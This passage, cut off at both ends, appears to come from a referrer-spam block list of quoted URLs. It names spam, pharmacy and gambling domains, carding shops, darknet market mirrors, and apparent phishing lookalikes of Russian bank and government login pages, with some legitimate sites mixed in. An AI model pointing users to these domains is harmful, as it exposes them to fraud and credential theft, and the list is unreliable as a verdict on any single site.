"https://antiguabarbuda.ru", "https://antonovich-design.com.ua", "https://apollon-market-url.org", "https://applepharma.ru", "https://apteka-doc.ru", "https://apteka-pharm.ru", "https://arabic-poetry.com", "https://arendadogovor.ru", "https://arendakvartir.kz", "https://arendovalka.xyz", "https://argo-visa.ru", "https://arkkivoltti.net", "https://artblog.top", "https://artclipart.ru", "https://artdeko.info", "https://artpaint-market.ru", "https://artparquet.ru", "https://artpress.top", "https://arturs.moscow", "https://aruplighting.com", "https://ask-yug.com", "https://asupro.com", "https://asynt.net", "https://atleticpharm.org", "https://atyks.ru", "https://auto-b2b-seo-service.com", "https://auto-complex.by", "https://auto-kia-fulldrive.ru", "https://auto-seo-service.org", "https://autoblog.org.ua", "https://autofuct.ru", "https://automobile-spec.com", "https://autoseo-service.org", "https://autoseo-traffic.com", "https://autoseotips.com", "https://autoservic.by", "https://autovideobroadcast.com", "https://avcoast.com", "https://aviaseller.su", "https://aviva-limoux.com", "https://avkzarabotok.info", "https://avtointeres.ru", "https://avtorskoe-vino.ru", "https://avtovykup.kz", "https://aworlds.com", "https://axcus.top", "https://azartclub.org", "https://azbukafree.com", "https://azlex.uz", "https://backlinks-fast-top.com", "https://baixar-musicas-gratis.com", "https://baladur.ru", "https://balakhna.online", "https://balayazh.com", "https://balitouroffice.com", "https://balkanfarma.org", "https://bankhummer.co", "https://barbarahome.top", "https://bard-real.com.ua", "https://batietiket.com", "https://batut-fun.ru", "https://bavariagid.de", "https://bdf-tracker.top", "https://beachtoday.ru", "https://beauty-lesson.com", "https://beclean-nn.ru", "https://bedroomlighting.us", "https://belreferatov.net", "https://beremenyashka.com", "https://best-deal-hdd.pro", "https://best-mam.ru", "https://best-ping-service-usa.blue", "https://best-printmsk.ru", "https://best-seo-offer.com", "https://best-seo-software.xyz", "https://best-seo-solution.com", "https://bestbookclub.ru", "https://bestfortraders.com", "https://bestmobilityscooterstoday.com", "https://bestofferhddbyt.info", "https://bestofferhddeed.info", "https://bestvpnrating.com", "https://bestwebsitesawards.com", "https://bet-winner1.ru", "https://betslive.ru", "https://betterhealthbeauty.com", "https://bettorschool.ru", "https://bez-zabora.ru", "https://bezprostatita.com", "https://bhf.vc", "https://bif-ru.info", "https://biglistofwebsites.com", "https://billiard-classic.com.ua", "https://billyblog.online", "https://bin-brokers.com", "https://binokna.ru", "https://bio-market.kz", "https://biplanecentre.ru", "https://bird1.ru", "https://bitcoin-ua.top", "https://biteg.xyz", "https://bitniex.com", "https://biz-law.ru", "https://bizru.info", "https://bki24.info", "https://black-friday.ga", "https://black-tip.top", "https://blackhatworth.com", "https://blog100.org", "https://blog2019.top", "https://blog2019.xyz", "https://blog4u.top", "https://blogking.top", "https://bloglag.com", "https://blogseo.xyz", "https://blogstar.fun", "https://blogtotal.de", "https://blogua.org", "https://blue-square.biz", "https://bluerobot.info", "https://bo-vtb24.ru", "https://boltalko.xyz", "https://boltushkiclub.ru", "https://bonkers.name", "https://bonus-spasibo-sberbank.ru", "https://bonus-vtb.ru", "https://books-top.com", "https://boostmyppc.com", "https://botamycos.fr", "https://bottraffic4free.club", "https://bottraffic4free.host", "https://bpro1.top", "https://brakehawk.com", "https://brateg.xyz", "https://brauni.com.ua", "https://bravica.biz", "https://bravica.com", "https://bravica.me", "https://bravica.net", "https://bravica.news", "https://bravica.online", "https://bravica.pro", "https://bravica.ru", "https://bravica.su", "https://break-the-chains.com", "https://brickmaster.pro", "https://brillianty.info", "https://brk-rti.ru", "https://brooklynsays.com", "https://brothers-smaller.ru", "https://brusilov.ru", "https://bsell.ru", "https://btcnix.com", "https://btt-club.pro", "https://budilneg.xyz", "https://budmavtomatika.com.ua", "https://bufetout.ru", "https://buhproffi.ru", "https://buildnw.ru", "https://buildwithwendy.com", "https://buketeg.xyz", "https://bukleteg.xyz", "https://bulgaria-web-developers.com", "https://bur-rk.ru", "https://burger-imperia.com", "https://burn-fat.ga", "https://business-online-sberbank.ru", "https://buttons-for-website.com", "https://buttons-for-your-website.com", "https://buy-cheap-online.info", "https://buy-cheap-pills-order-online.com", "https://buy-forum.ru", "https://buy-meds24.com", "https://buynorxx.com", "https://buypillsonline24h.com", "https://buypuppies.ca", "https://c2bit.hk", "https://call-of-duty.info", "https://cancerfungus.com", "https://candida-society.org.uk", "https://cannazon-market.org", "https://carder.me", "https://carder.tv", "https://carders.ug", "https://cardiosport.com.ua", "https://cardsdumps.com", "https://carezi.com", "https://carivka.com.ua", "https://carscrim.com", "https://cartechnic.ru", "https://cashforum.cc", "https://casino-top3.fun", "https://casino-top3.online", "https://casino-top3.ru", "https://casino-top3.site", "https://casino-top3.space", "https://casino-top3.website", "https://casino-v.site", "https://casino-vulkane.com", "https://casino-x.host", "https://catherinemill.xyz", "https://catterybengal.com", "https://cattyhealth.com", "https://cazino-v.online", "https://cazino-v.ru", "https://ccfullzshop.com", "https://celestepage.xyz", "https://cenokos.ru", "https://cenoval.ru", "https://certifywebsite.win", "https://cezartabac.ro", "https://chainii.ru", "https://chatroulette.life", "https://chcu.net", "https://cheap-trusted-backlinks.com", "https://cheapkeys.ovh", "https://cheappills24h.com", "https://check-host.net", "https://check-host.net/", "https://chinese-amezon.com", "https://chip35.ru", "https://chipmp3.ru", "https://chizhik-2.ru", "https://ci.ua", "https://cityadspix.com", "https://citybur.ru", "https://cityreys.ru", "https://civilwartheater.com", "https://cleandom.in.ua", "https://clicksor.com", "https://climate.by", "https://clothing-deal.club", "https://club-lukojl.ru", "https://coderstate.com", "https://codysbbq.com", "https://coeus-solutions.de", "https://coffeemashiny.ru", "https://coinswitch.cash", "https://coleso.md", "https://collectinviolity.com", "https://columb.net.ua", "https://commentag.com", "https://commerage.ru", "https://comp-pomosch.ru", "https://compliance-alex.xyz", "https://compliance-alexa.xyz", "https://compliance-andrew.xyz", "https://compliance-barak.xyz", "https://compliance-brian.xyz", "https://compliance-don.xyz", "https://compliance-donald.xyz", "https://compliance-elena.xyz", "https://compliance-fred.xyz", "https://compliance-george.xyz", "https://compliance-irvin.xyz", "https://compliance-ivan.xyz", "https://compliance-john.top", "https://compliance-julianna.top", "https://computer-remont.ru", "https://conciergegroup.org", "https://concretepol.com", "https://connectikastudio.com", "https://constanceonline.top", "https://cookie-law-enforcement-aa.xyz", "https://cookie-law-enforcement-bb.xyz", "https://cookie-law-enforcement-cc.xyz", "https://cookie-law-enforcement-dd.xyz", "https://cookie-law-enforcement-ee.xyz", "https://cookie-law-enforcement-ff.xyz", "https://cookie-law-enforcement-gg.xyz", "https://cookie-law-enforcement-hh.xyz", "https://cookie-law-enforcement-ii.xyz", "https://cookie-law-enforcement-jj.xyz", "https://cookie-law-enforcement-kk.xyz", "https://cookie-law-enforcement-ll.xyz", "https://cookie-law-enforcement-mm.xyz", "https://cookie-law-enforcement-nn.xyz", "https://cookie-law-enforcement-oo.xyz", "https://cookie-law-enforcement-pp.xyz", "https://cookie-law-enforcement-qq.xyz", "https://cookie-law-enforcement-rr.xyz", "https://cookie-law-enforcement-ss.xyz", "https://cookie-law-enforcement-tt.xyz", "https://cookie-law-enforcement-uu.xyz", "https://cookie-law-enforcement-vv.xyz", "https://cookie-law-enforcement-ww.xyz", "https://cookie-law-enforcement-xx.xyz", "https://cookie-law-enforcement-yy.xyz", "https://cookie-law-enforcement-zz.xyz", "https://cool-mining.com", "https://copyrightclaims.org", "https://copyrightinstitute.org", "https://coral-info.com", "https://cosmediqueresults.com", "https://covadhosting.biz", "https://coverage-my.com", "https://covid-schutzmasken.de", "https://cp24.com.ua", "https://crazy-mining.org", "https://credit-card-tinkoff.ru", "https://credit-cards-online24.ru", "https://credit.co.ua", "https://crypto-bear.com", "https://crypto-bears.com", "https://crypto-mining.club", "https://crypto1x1.com", "https://curenaturalicancro.com", "https://curenaturalicancro.nl", "https://customsua.com.ua", "https://cyber-monday.ga", "https://dacha-svoimi-rukami.com", "https://dailyrank.net", "https://dailyseo.xyz", "https://dailystorm.ru", "https://damianis.ru", "https://darknet-hydra-onion.biz", "https://darknet.sb", "https://darknetsitesguide.com", "https://darleneblog.online", "https://darodar.com", "https://dav.kz", "https://dawlenie.com", "https://dbutton.net", "https://dcdcapital.com", "https://deart-13.ru", "https://deirdre.top", "https://delfin-aqua.com.ua", "https://delo.fund", "https://deluxewatch.su", "https://demenageur.com", "https://dengi-v-kredit.in.ua", "https://denisecarey.top", "https://deniseconnie.top", "https://dent-home.ru", "https://dentuled.net", "https://dermatovenerologiya.com", "https://deryie.com", "https://descargar-musica-gratis.net", "https://detailedvideos.com", "https://detskie-konstruktory.ru", "https://deutsche-poesie.com", "https://dev-seo.blog", "https://developers.google.com/speed/pagespeed/insights/?url=", "https://diatelier.ru", "https://dicru.info", "https://dienai.ru", "https://diplomas-ru.com", "https://dipstar.org", "https://discounttaxi.kz", "https://distonija.com", "https://divan-dekor.com.ua", "https://dividendo.ru", "https://djekxa.ru", "https://djonwatch.ru", "https://dktr.ru", "https://dna-sklad.ru", "https://dnmetall.ru", "https://docs4all.com", "https://docsarchive.net", "https://docsportal.net", "https://doctornadezhda.ru", "https://documentbase.net", "https://documentserver.net", "https://documentsite.net", "https://dodge-forum.eu", "https://doggyhealthy.com", "https://dogovorpodryada.ru", "https://dogsrun.net", "https://dojki-devki.ru", "https://dojki-hd.com", "https://dom-international.ru", "https://domain-tracker.com", "https://domashniy-hotel.ru", "https://domashniy-recepti.ru", "https://dominateforex.ml", "https://domination.ml", "https://dommdom.com", "https://domovozik.ru", "https://dompechey.by", "https://domsadiogorod.ru", "https://doska-vsem.ru", "https://dostavka-v-krym.com", "https://dosugrostov.site", "https://doxyporno.com", "https://doxysexy.com", "https://draniki.org", "https://dreamland-bg.com", "https://dreams-works.net", "https://drev.biz", "https://drive.google.com/viewerng/viewer?url=", "https://drugs-no-rx.info", "https://drugstoreforyou.com", "https://drupa.com", "https://dspautomations.com", "https://duitbux.info", "https://dumpsccshop.com", "https://dvk-stroi.ru", "https://dvr.biz.ua", "https://dzinerstudio.com", "https://e-buyeasy.com", "https://e-commerce-seo.com", "https://e-commerce-seo1.com", "https://e-stroymart.kz", "https://eaptekaplus.ru", "https://earn-from-articles.com", "https://earnian-money.info", "https://easycommerce.cf", "https://ecblog.xyz", "https://ecommerce-seo.org", "https://ecomp3.ru", "https://econom.co", "https://edakgfvwql.ru", "https://edmed-sonline.com", "https://eduardoluis.com", "https://educhess.ru", "https://edudocs.net", "https://eduinfosite.com", "https://eduserver.net", "https://ege-essay.ru", "https://ege-krasnoyarsk.ru", "https://egovaleo.it", "https://ek-invest.ru", "https://ekatalog.xyz", "https://ekbspravka.ru", "https://eko-gazon.ru", "https://ekoproekt-kr.ru", "https://ekto.ee", "https://eldoradorent.az", "https://electric-blue-industries.com", "https://elegante-vitrage.ru", "https://elektrikovich.ru", "https://elementspluss.ru", "https://elenatkachenko.com.ua", "https://elentur.com.ua", "https://elizabethbruno.top", "https://ellemarket.com", "https://elmifarhangi.com", "https://elvel.com.ua", "https://emctestlab.ru", "https://emerson-rus.ru", "https://empire-market.org", "https://empire-market.xyz", "https://empiremarket-link.org", "https://empirestuff.org", "https://energomash.net", "https://energysexy.com", "https://englishtopic.ru", "https://enter-unicredit.ru", "https://epicdiving.com", "https://eraglass.com", "https://eric-artem.com", "https://erofus.online", "https://eropho.com", "https://eropho.net", "https://erot.co", "https://erotag.com", "https://es-pfrf.ru", "https://escort-russian.com", "https://eskei83.com", "https://esoterikforum.at", "https://estdj.com", "https://este-line.com.ua", "https://etairikavideo.gr", "https://etehnika.com.ua", "https://etotupo.ru", "https://ets-2-mod.ru", "https://eu-cookie-law-enforcement2.xyz", "https://eurocredit.xyz", "https://euromasterclass.ru", "https://europages.com.ru", "https://eurosamodelki.ru", "https://event-tracking.com", "https://eventiyahall.ru", "https://exclusive-profit.com", "https://exdocsfiles.com", "https://expediacustomerservicenumber.online", "https://expert-find.ru", "https://express-vyvoz.ru", "https://eyes-on-you.ga", "https://f1nder.org", "https://fainaidea.com", "https://falco3d.com", "https://falcoware.com", "https://fanoboi.com", "https://fartunabest.ru", "https://fashiong.ru", "https://fast-wordpress-start.com", "https://fastgg.net", "https://favoritki-msk.ru", "https://fazika.ru", "https://fbdownloader.com", "https://feminist.org.ua", "https://fialka.tomsk.ru", "https://fidalsa.de", "https://filesclub.net", "https://filesdatabase.net", "https://films2018.com", "https://filter-ot-zheleza.ru", "https://financial-simulation.com", "https://finansov.info", "https://finder.cool", "https://findercarphotos.com", "https://firstblog.top", "https://fit-discount.ru", "https://fitodar.com.ua", "https://fix-website-errors.com", "https://flexderek.com", "https://floating-share-buttons.com", "https://flowertherapy.ru", "https://flyblog.xyz", "https://foojo.net", "https://for-marketersy.info", "https://for-your.website", "https://forex-procto.ru", "https://forsex.info", "https://fortwosmartcar.pw", "https://forum69.info", "https://foxweber.com", "https://francaise-poesie.com", "https://frankofficial.ru", "https://frauplus.ru", "https://free-fb-traffic.com", "https://free-fbook-traffic.com", "https://free-floating-buttons.com", "https://free-games-download.falcoware.com", "https://free-share-buttons.com", "https://free-social-buttons.com", "https://free-social-buttons.xyz", "https://free-social-buttons7.xyz", "https://free-traffic.xyz", "https://free-video-tool.com", "https://free-website-traffic.com", "https://freenode.info", "https://freewhatsappload.com", "https://freewlan.info", "https://freshnails.com.ua", "https://fsalas.com", "https://fsin-pokypka.ru", "https://fullzdumps.cc", "https://furniturehomewares.com", "https://galblog.top", "https://game300.ru", "https://gandikapper.ru", "https://garantprava.com", "https://gasvleningrade.ru", "https://gatwick.ru", "https://gazel-72.ru", "https://gbh-invest.ru", "https://gearcraft.us", "https://gearsadspromo.club", "https://geliyballon.ru", "https://gelstate.ru", "https://generalporn.org", "https://geniusfood.co.uk", "https://georgeblog.online", "https://gepatit-info.top", "https://germes-trans.com", "https://get-clickize.info", "https://get-free-social-traffic.com", "https://get-free-traffic-now.com", "https://get-more-freeer-visitors.info", "https://get-more-freeish-visitors.info", "https://get-seo-help.com", "https://get-your-social-buttons.info", "https://getaadsincome.info", "https://getadsincomely.info", "https://getfy-click.info", "https://getlamborghini.ga", "https://getpy-click.info", "https://getrichquick.ml", "https://getrichquickly.info", "https://gezlev.com.ua", "https://ghazel.ru", "https://ghostvisitor.com", "https://gidonline.one", "https://gidro-partner.ru", "https://giftbig.ru", "https://girlporn.ru", "https://gk-casino.fun", "https://gk-casino.online", "https://gk-casino.ru", "https://gk-casino.site", "https://gk-casino.space", "https://gk-casino.website", "https://gkvector.ru", "https://glavprofit.ru", "https://global-smm.ru", "https://gobongo.info", "https://golden-praga.ru", "https://good-potolok.ru", "https://goodbyecellulite.ru", "https://goodhumor24.com", "https://goodprotein.ru", "https://google-liar.ru", "https://googlemare.com", "https://googlsucks.com", "https://gorgaz.info", "https://grafaman.ru", "https://greatblog.top", "https://greentechsy.com", "https://groshi-kredut.com.ua", "https://growth-hackingan.info", "https://growth-hackingor.info", "https://growth-hackingy.info", "https://gruzchiki24.ru", "https://guardlink.org", "https://guidetopetersburg.com", "https://halat.xyz", "https://halefa.com", "https://handicapvantoday.com", "https://hankspring.xyz", "https://happysong.ru", "https://hard-porn.mobi", "https://havepussy.com", "https://hawaiisurf.com", "https://hd1080film.ru", "https://hdhc.site", "https://hdmoviecamera.net", "https://hdmoviecams.com", "https://headpharmacy.com", "https://healbio.ru", "https://healgastro.com", "https://healthhacks.ru", "https://help.baidu.com/searchResult?keywords=", "https://hentai-manga.porn", "https://heroero.com", "https://hexometer.com", "https://hit-kino.ru", "https://holiday-shop.ru", "https://holistickenko.com", "https://holodkovich.com", "https://homeafrikalike.tk", "https://homemypicture.tk", "https://hongfanji.com", "https://hostiman.ru", "https://hosting-tracker.com", "https://hotblognetwork.com", "https://hottour.com", "https://housedesigning.ru", "https://housediz.com", "https://housemilan.ru", "https://howopen.ru", "https://howtostopreferralspam.eu", "https://hoztorg-opt.ru", "https://hseipaa.kz", "https://hulfingtonpost.com", "https://humanorightswatch.org", "https://hundejo.com", "https://huntdown.info", "https://hvd-store.com", "https://hydra-2019.ru", "https://hydra-2020.online", "https://hydra-2020.ru", "https://hydra-centr.fun", "https://hydra-guide.org", "https://hydra-new.online", "https://hydra-onion-faq.com", "https://hydra-pc.com", "https://hydra-shop.org", "https://hydra-site.ru", "https://hydra-vhod2020.com", "https://hydra-zerkalo20.com", "https://hydra2.market", "https://hydra2020.top", "https://hydra2020gate.com", "https://hydra2020market.com", "https://hydra2020onion.com", "https://hydra2020zerkalo.com", "https://hydra20onion.com", "https://hydra20online.com", "https://hydra20original.com", "https://hydra2use.com", "https://hydra2zahod.com", "https://hydraena.com", "https://hydrahow.com", "https://hydraland.net", "https://hydramarket2020.com", "https://hydramirror2020.com", "https://hydranten.net", "https://hydraonion2019.net", "https://hydraruz-2020.com", "https://hydraruzonion2020.com", "https://hydraruzxpnew4af.com.co", "https://hydraruzxpnew4af.ink", "https://hydraulicoilcooler.net", "https://hydrauliczny.com", "https://hydravizoficial.info", "https://hydrazerkalo2019.net", "https://hyip-zanoza.me", "https://i-spare.ru", "https://ib-homecredit.ru", "https://ib-rencredit.ru", "https://iceton.net", "https://ico.re", "https://ideayz.com", "https://igadgetsworld.com", "https://igru-xbox.net", "https://ilikevitaly.com", "https://iloveitaly.ro", "https://iloveitaly.ru", "https://ilovevitaly.co", "https://ilovevitaly.com", "https://ilovevitaly.info", "https://ilovevitaly.org", "https://ilovevitaly.ru", "https://ilovevitaly.xyz", "https://iminent.com", "https://immigrational.info", "https://imperiafilm.ru", "https://impotentik.com", "https://in-mostbet.ru", "https://in-sto.ru", "https://incanto.in.ua", "https://incitystroy.ru", "https://incomekey.net", "https://increasewwwtraffic.info", "https://inet-shop.su", "https://infektsii.com", "https://infodocsportal.com", "https://infogame.name", "https://inform-ua.info", "https://ingramreed.xyz", "https://inmoll.com", "https://insider.pro", "https://installspartners.com", "https://instasexyblog.com", "https://insultu-net.ru", "https://interferencer.ru", "https://intex-air.ru", "https://investpamm.ru", "https://iskalko.ru", "https://iskussnica.ru", "https://isotoner.com", "https://ispaniya-costa-blanca.ru", "https://it-max.com.ua", "https://it-worlds.com", "https://izamorfix.ru", "https://izhstrelok.ru", "https://janemill.xyz", "https://jav-fetish.com", "https://jav-fetish.site", "https://jav-idol.com", "https://javcoast.com", "https://javlibrary.cc", "https://jeffbullas.xyz", "https://jjbabskoe.ru", "https://job-opros.ru", "https://job-prosto.ru", "https://jobgirl24.ru", "https://jobius.com.ua", "https://josephineblog.top", "https://jumkite.com", "https://justkillingti.me", "https://justprofit.xyz", "https://kabbalah-red-bracelets.com", "https://kabinet-5ka.ru", "https://kabinet-alfaclick.ru", "https://kabinet-binbank.ru", "https://kabinet-card-5ka.ru", "https://kabinet-click-alfabank.ru", "https://kabinet-esia-gosuslugi.ru", "https://kabinet-faberlic.ru", "https://kabinet-gosuslugi.ru", "https://kabinet-ipoteka-domclick.ru", "https://kabinet-karta-5ka.ru", "https://kabinet-lk-megafon.ru", "https://kabinet-lk-rt.ru", "https://kabinet-login-mts.ru", "https://kabinet-mil.ru", "https://kabinet-mos.ru", "https://kabinet-my-beeline.ru", "https://kabinet-my-pochtabank.ru", "https://kabinet-nalog.ru", "https://kabinet-online-bm.ru", "https://kabinet-online-open.ru", "https://kabinet-online-rsb.ru", "https://kabinet-online-rshb.ru", "https://kabinet-online-sberbank.ru", "https://kabinet-online-sovcombank.ru", "https://kabinet-online-vtb.ru", "https://kabinet-pfr.ru", "https://kabinet-pfrf.ru", "https://kabinet-platon.ru", "https://kabinet-qiwi.ru", "https://kabinet-tele2.ru", "https://kabinet-tinkoff.ru", "https://kabinet-tricolor.ru", "https://kabinet-ttk.ru", "https://kabinet-vtb24.ru", "https://kakablog.net", "https://kakadu-interior.com.ua", "https://kakworldoftanks.ru", "https://kambasoft.com", "https://kamin-sam.ru", "https://kanakox.com", "https://karapuz.org.ua", "https://kazka.ru", "https://kazlenta.kz", "https://kazrent.com", "https://kerch.site", "https://kevblog.top", "https://keywords-monitoring-success.com", "https://keywords-monitoring-your-success.com", "https://kharkov.ua", "https://kierowca-praca.pl", "https://kinnarimasajes.com", "https://kino-fun.ru", "https://kino-key.info", "https://kino2018.cc", "https://kinobum.org", "https://kinopolet.net", "https://kinosed.net", "https://kinostar.online", "https://kiyany-za-spravedluvist.com.ua", "https://knigonosha.net", "https://kollekcioner.ru", "https://komp-pomosch.ru", "https://komputers-best.ru", "https://komukc.com.ua", "https://konkursov.net", "https://kosunnyclub.com", "https://kozhakoshek.com", "https://kozhasobak.com", "https://kozhniebolezni.com", "https://krasivoe-hd.net", "https://krasnodar-avtolombard.ru", "https://krasota-zdorovie.pw", "https://krasota.ru", "https://kredutu.com.ua", "https://kredytbank.com.ua", "https://kruiz-sochi.ru", "https://krumble-adsde.info", "https://krumble-adsen.info", "https://krumbleent-ads.info", "https://l2soft.eu", "https://lakiikraski.ru", "https://lalalove.ru", "https://laminat.com.ua", "https://landliver.org", "https://landoftracking.com", "https://laptop-4-less.com", "https://law-check-two.xyz", "https://law-enforcement-bot-ff.xyz", "https://law-enforcement-check-three.xyz", "https://law-enforcement-ee.xyz", "https://law-six.xyz", "https://lawrenceblog.online", "https://laxdrills.com", "https://leboard.ru", "https://ledalfa.by", "https://leddjc.net", "https://ledx.by", "https://leeboyrussia.com", "https://legalrc.biz", "https://lerporn.info", "https://leto-dacha.ru", "https://lider82.ru", "https://lifespeaker.ru", "https://ligastavok-in.ru", "https://lindsayblog.online", "https://lipidofobia.com.br", "https://littleberry.ru", "https://livefixer.com", "https://livejournal.top", "https://livia-pache.ru", "https://livingroomdecoratingideas.website", "https://lk-gosuslugi.ru", "https://lk-lk-rt.ru", "https://local-seo-for-multiple-locations.com", "https://login-tinkoff.ru", "https://logo-all.ru", "https://lolz.guru", "https://lolzteam.online", "https://lolzteam.org", "https://lotoflotto.ru", "https://loveorganic.ch", "https://lowpricesiterx.com", "https://lsex.xyz", "https://luckybull.io", "https://lukoilcard.ru", "https://lumb.co", "https://luton-invest.ru", "https://luxup.ru", "https://luxurybet.ru", "https://magicart.store", "https://magicdiet.gq", "https://magnetic-bracelets.ru", "https://mainhunter.com", "https://makemoneyonline.com", "https://makeprogress.ga", "https://makler.org.ua", "https://maltadailypost.com", "https://mamylik.ru", "https://manimpotence.com", "https://marathonbet-in.ru", "https://marblestyle.ru", "https://maridan.com.ua", "https://marinetraffic.com", "https://marjorieblog.online", "https://marketland.ml", "https://martinahome.xyz", "https://masterseek.com", "https://matomete.net", "https://matras.space", "https://mattgibson.us", "https://max-apprais.com", "https://maxinesamson.top", "https://maxxximoda.ru", "https://mebel-arts.com", "https://mebel-ekb.com", "https://mebel-iz-dereva.kiev.ua", "https://mebelcomplekt.ru", "https://mebeldekor.com.ua", "https://meblieco.com", "https://med-dopomoga.com", "https://med-recept.ru", "https://med-zdorovie.com.ua", "https://medbrowse.info", "https://medcor-list.ru", "https://medic-al.ru", "https://medicaltranslate.ru", "https://medicineseasybuy.com", "https://meds-online24.com", "https://meduza-consult.ru", "https://megalit-d.ru", "https://megapolis-96.ru", "https://megatkani.ru", "https://melbet-in.ru", "https://melissahome.top", "https://meriton.ru", "https://metallo-konstruktsii.ru", "https://metallosajding.ru", "https://meteocast.net", "https://mhp.su", "https://miaxxx.com", "https://midnight.im", "https://mifepriston.net", "https://migronis.com", "https://mikozstop.com", "https://mikrocement.com.ua", "https://mikrozaim.site", "https://mikrozaym2you.ru", "https://minegam.com", "https://miningblack.net", "https://mirfairytale.ru", "https://mirobuvi.com.ua", "https://mirtorrent.net", "https://misselle.ru", "https://mksoap.ru", "https://mksport.ru", "https://mmdoors.ru", "https://mmm.lc", "https://mmm.sb", "https://mnogabukaff.net", "https://mobicover.com.ua", "https://mobilemedia.md", "https://mockupui.com", "https://modforwot.ru", "https://modnie-futbolki.net", "https://moe1.ru", "https://moinozhki.com", "https://moiragracie.top", "https://moisadogorod.ru", "https://monetizationking.net", "https://money-for-placing-articles.com", "https://money7777.info", "https://moneytop.ru", "https://moneyzzz.ru", "https://monicablog.xyz", "https://moon.market", "https://moonci.ru", "https://mosputana.info", "https://mosputana.top", "https://mosrif.ru", "https://mostbet-original.ru", "https://mostcool.top", "https://mostorgnerud.ru", "https://moy-dokument.com", "https://moy-evroopt.ru", "https://moyakuhnia.ru", "https://moyaskidka.ru", "https://moygorod-online.ru", "https://moyparnik.com", "https://mrbojikobi4.biz", "https://mrt-info.ru", "https://msk-sprawka.com", "https://mtsguru.ru", "https://muscle-factory.com.ua", "https://musichallaudio.ru", "https://mwductwork.com", "https://mybestoffers.club", "https://myborder.ru", "https://mybuh.kz", "https://mycheaptraffic.com", "https://mycollegereview.com", "https://mydirtystuff.com", "https://mydoctorok.ru", "https://myecomir.com", "https://myftpupload.com", "https://myplaycity.com", "https://mysexpics.ru", "https://nachalka21.ru", "https://nakozhe.com", "https://nancyblog.top", "https://nanochskazki.ru", "https://naobumium.info", "https://narosty.com", "https://natali-forex.com", "https://natprof.ru", "https://naturalpharm.com.ua", "https://navek.by", "https://nbok.net", "https://needtosellmyhousefast.com", "https://net-profits.xyz", "https://nevapotolok.ru", "https://newagebev.com", "https://newsrosprom.ru", "https://newstaffadsshop.club", "https://nicola.top", "https://niki-mlt.ru", "https://ninacecillia.top", "https://no-rx.info", "https://nomerounddec.cf", "https://novosti-avto.ru", "https://novosti-hi-tech.ru", "https://novostic.ru", "https://ntdtv.ru", "https://nubuilderian.info", "https://nufaq.com", "https://nwrcz.com", "https://nyinfo.org", "https://o-o-11-o-o.com", "https://o-o-6-o-o.com", "https://o-o-6-o-o.ru", "https://o-o-8-o-o.com", "https://o-o-8-o-o.ru", "https://o-promyshlennosti.ru", "https://obnallpro.cc", "https://obsessionphrases.com", "https://obyavka.org.ua", "https://obzor-casino-x.online", "https://obzor-casino-x.ru", "https://odiabetikah.com", "https://odsadsmobile.biz", "https://ofermerah.com", "https://office2web.com", "https://officedocuments.net", "https://ogorodnic.com", "https://okna-systems.pro", "https://okno.ooo", "https://okoshkah.com", "https://olovoley.ru", "https://one-a-plus.xyz", "https://onionhydra.net", "https://online-akbars.ru", "https://online-binbank.ru", "https://online-hit.info", "https://online-intim.com", "https://online-mkb.ru", "https://online-pharma.ru", "https://online-pochtabank.ru", "https://online-raiffeisen.ru", "https://online-sbank.ru", "https://online-templatestore.com", "https://online-vostbank.ru", "https://online-vtb.ru", "https://onlinedic.net", "https://onlinetvseries.me", "https://onlinewot.ru", "https://onlywoman.org", "https://oohlivecams.com", "https://ooo-olni.ru", "https://oooh.pro", "https://optsol.ru", "https://oqex.io", "https://oracle-patches.ru", "https://orakul.spb.ru", "https://osteochondrosis.ru", "https://otdbiaxaem-vmeste.ru", "https://otdyx-s-komfortom.ru", "https://oudallas.net", "https://ownshop.cf", "https://ozas.net", "https://pacobarrero.com", "https://pageinsider.org", "https://paidonlinesites.com", "https://painting-planet.com", "https://palma-de-sochi.ru", "https://palvira.com.ua", "https://pamjatnik.com.ua", "https://pamyatnik-spb.ru", "https://pamyatnik-tsena.ru", "https://paretto.ru", "https://parking-invest.ru", "https://partizan19.ru", "https://partnerskie-programmy.net", "https://paulinho.ru", "https://pay.ru", "https://pc-services.ru", "https://penzu.xyz", "https://perform-like-alibabaity.info", "https://perform-likeism-alibaba.info", "https://perm.dienai.ru", "https://perper.ru", "https://petrovka-online.com", "https://petrushka-restoran.ru", "https://pfrf-kabinet.ru", "https://pharm--shop.ru", "https://photo-clip.ru", "https://photokitchendesign.com", "https://php-market.ru", "https://picturesmania.com", "https://pills24h.com", "https://piluli.info", "https://pinupcasinos.ru", "https://pinupcasinos1.ru", "https://piratbike.ru", "https://pirelli-matador.ru", "https://piulatte.cz", "https://pizdeishn.com", "https://pizdeishn.net", "https://pizza-imperia.com", "https://pizza-tycoon.com", "https://pk-pomosch.ru", "https://pk-services.ru", "https://plagscan.com", "https://play.google.com/store/search?q=", "https://podarkilove.ru", "https://poddon-moskva.ru", "https://podemnik.pro", "https://podseka1.ru", "https://poiskzakona.ru", "https://poker-royal777.com", "https://pokupaylegko.ru", "https://polemikon.ru", "https://politika.bg", "https://polyana-skazok.org.ua", "https://popads.net", "https://popelina.com", "https://pops.foundation", "https://popugauka.ru", "https://popugaychiki.com", "https://porndl.org", "https://pornhive.org", "https://pornhub-forum.ga", "https://pornhub-ru.com", "https://porno-asia.com", "https://porno-chaman.info", "https://porno-gallery.ru", "https://porno2xl.net", "https://pornobest.su", "https://pornoelita.info", "https://pornoforadult.com", "https://pornogig.com", "https://pornohd1080.online", "https://pornoklad.ru", "https://pornonik.com", "https://pornoplen.com", "https://pornosemki.info", "https://pornoslave.net", "https://portnoff.od.ua", "https://pospektr.ru", "https://posteezy.xyz", "https://potolokelekor.ru", "https://povodok-shop.ru", "https://pozdravleniya-c.ru", "https://predmety.in.ua", "https://prezidentshop.ru", "https://priceg.com", "https://pricheski-video.com", "https://primfootball.com", "https://print-technology.ru", "https://private-service.best", "https://prizrn.site", "https://prlog.ru", "https://probenzo.com.ua", "https://procrafts.ru", "https://prodaemdveri.com", "https://producm.ru", "https://prodvigator.ua", "https://professionalsolutions.eu", "https://profnastil-moscow.ru", "https://progressive-seo.com", "https://prointer.net.ua", "https://prom23.ru", "https://promoforum.ru", "https://promoteapps.online", "https://promotion-for99.com", "https://pron.pro", "https://prosmibank.ru", "https://prostitutki-rostova.ru.com", "https://prostoacc.com", "https://psa48.ru", "https://psn-card.ru", "https://ptashkatextil.ua", "https://ptfic.org", "https://punch.media", "https://purchasepillsnorx.com", "https://puzzleweb.ru", "https://qoinex.top", "https://qualitymarketzone.com", "https://quickchange.cc", "https://quit-smoking.ga", "https://qwesa.ru", "https://r.search.yahoo.com", "https://r.search.yahoo.com/", "https://rachelblog.online", "https://rainbirds.ru", 